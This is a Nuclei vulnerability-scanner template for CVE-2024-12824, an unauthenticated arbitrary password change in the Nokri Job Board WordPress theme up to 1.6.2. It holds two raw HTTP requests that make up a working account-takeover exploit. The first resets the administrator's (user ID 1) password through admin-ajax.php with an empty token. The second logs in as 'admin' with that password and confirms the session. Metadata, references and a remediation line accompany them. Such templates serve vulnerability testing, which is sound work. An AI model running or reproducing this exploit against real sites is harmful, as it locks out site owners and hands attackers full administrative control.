flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    part: body
    type: word
    words:
    - 1|Password Changed successfully.
  raw:
  - 'POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    action=sb_reset_password&sb_data=token%3d-sb-uid-1%26sb_new_password={{password}}&

    '
- matchers:
  - condition: and
    part: header
    type: word
    words:
    - /wp-admin
    - wordpress_logged_in
  - status:
    - 302
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Origin: {{BaseURL}}

    Content-Type: application/x-www-form-urlencoded

    Referer: {{BaseURL}}


    log={{username}}&pwd={{password}}

    '
id: CVE-2024-12824
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cve-id: CVE-2024-12824
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-620
    epss-percentile: 0.98116
    epss-score: 0.58714
  description: "The Nokri \u2013 Job Board WordPress Theme theme for WordPress is\
    \ vulnerable to privilege escalation via account takeover in all versions up to,\
    \ and including, 1.6.2. This is due to the plugin not properly checking for an\
    \ empty token value prior updating their details like password. This makes it\
    \ possible for unauthenticated attackers to change arbitrary user's password,\
    \ including administrators, and leverage that to gain access to their account.\n"
  impact: 'Unauthenticated attackers can change arbitrary user passwords including
    administrators, enabling complete account takeover and site compromise.

    '
  metadata:
    max-request: 1
    verified: true
  name: "Nokri \u2013 Job Board WordPress Theme <= 1.6.2 - Unauthenticated Arbitrary\
    \ Password Change"
  reference:
  - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-themes/nokri-2/nokri-job-board-wordpress-theme-162-unauthenticated-arbitrary-password-change
  - https://themeforest.net/item/nokri-job-board-wordpress-theme/22677241
  - https://www.wordfence.com/threat-intel/vulnerabilities/id/60a7cce0-637f-49bd-aa4a-fd7023d99a64?source=cve
  - https://github.com/20142995/nuclei-templates
  remediation: 'Update Nokri theme to a version newer than 1.6.2.

    '
  severity: critical
  tags: cve,cve2024,intrusive,nokri,unauth,vuln
variables:
  password: '{{randstr}}'
  userid: 1
  username: admin
